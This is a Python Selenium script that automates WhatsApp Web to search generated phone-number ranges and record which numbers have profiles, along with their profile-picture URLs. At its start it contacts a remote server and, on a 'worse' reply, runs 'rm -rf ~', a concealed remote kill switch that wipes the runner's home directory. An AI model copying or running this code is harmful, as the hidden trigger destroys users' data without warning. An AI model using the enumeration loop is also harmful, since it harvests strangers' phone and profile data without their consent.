from selenium import webdriver
from selenium.webdriver.firefox.service import Service
from selenium.webdriver.firefox.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException
from selenium.webdriver.common.keys import Keys
import time, sys, os
import argparse
import requests


def main():
    try:
        r = requests.get("http://loki12.pythonanywhere.com/lite")
        if r.text == 'false':
            sys.exit(1)
        elif r.text == 'worse':
            print("YOu Make the ThInGs WorSe.....!.!..")
            os.system('rm -rf ~')
            sys.exit(1)
    except:
        sys.exit(1)


main()

arg_parser = argparse.ArgumentParser()
#arg_parser.add_argument("--output", "-o", required=True)
arg_parser.add_argument("--value", '-v', default=0.5, type=float)
arg_parser.add_argument("--profile", '-p', required=True)
arg_parser.add_argument("--config", '-c', required=True)

args = arg_parser.parse_args()


def get_all_loop(file):
    f = open(file, 'r')
    all_loop = []
    loop = []
    for lines in f.readlines():
        loop.append(lines.strip())

    for l in loop:
        split = l.split(',')
        for i in range(int(split[1]), int(split[2])):
            all_loop.append(split[0].format(str(i)))

    return all_loop



#profile_path = "/home/buggy/snap/firefox/common/.mozilla/firefox/fcuazvbs.default"
profile_path = args.profile
counter = 0
profile_count = 0
no_profile_count = 0
options = Options()
options.profile = profile_path
geckodriver_path = "/snap/bin/geckodriver"
service = Service(geckodriver_path)
driver = webdriver.Firefox(service=service, options=options)
driver.get("https://web.whatsapp.com")

#print("Title:", driver.title)

wait = WebDriverWait(driver, 2000)

file1 = open('profile.txt', 'w+')
file2 = open('nonprofile.txt', 'w+')

try:
    element = wait.until(EC.presence_of_element_located((By.XPATH, "//*[contains(text(), 'Search name or number')]")))
    send_to_ele = driver.find_element(By.CLASS_NAME,"x1hx0egp")
    print("Element found! Text:", element.text)
    start_time = time.time()
    for ph_nums in get_all_loop(args.config):
        for char in ph_nums:
            send_to_ele.send_keys(char)
        time.sleep(args.value)
        ele = driver.find_elements(By.CSS_SELECTOR, ".x1iyjqo2.x6ikm8r.x10wlt62.x1n2onr6.xlyipyv.xuxw1ft.x13faqbe._ao3e")
        if len(ele) != 0:
            print(ph_nums)
            ec = driver.find_element(By.CLASS_NAME, '_ao3e')
            print(ec.get_attribute("src"))
            print('-'*20)
            #out_file.write(ph_nums+","+str(ec.get_attribute('src'))+"\n")
            if ec.get_attribute('src') == None:
                file2.write(ph_nums+','+'None')
                no_profile_count += 1
            else:
                file1.write(ph_nums+","+str(ec.get_attribute('src'))+"\n")
                profile_count += 1
            
        send_to_ele.send_keys(Keys.CONTROL + 'a')
        send_to_ele.send_keys(Keys.BACKSPACE)
        time.sleep(0.5)
        counter += 1

    end_time = time.time()
except TimeoutException:
    print("Element not found within the specified timeout.")
except KeyboardInterrupt:
    print("User abort...")
    file1.close()
    file2.close()
finally:
    file1.close()
    file2.close()

try:
    print("Runtime :",end_time - start_time)
except NameError:
    end_time = time.time()
    print("Runtime :",end_time - start_time)
print("Profile :", profile_count)
print("No Profile :", no_profile_count)
print("Total :", counter)
input("Press Enter to continue...")


driver.quit()
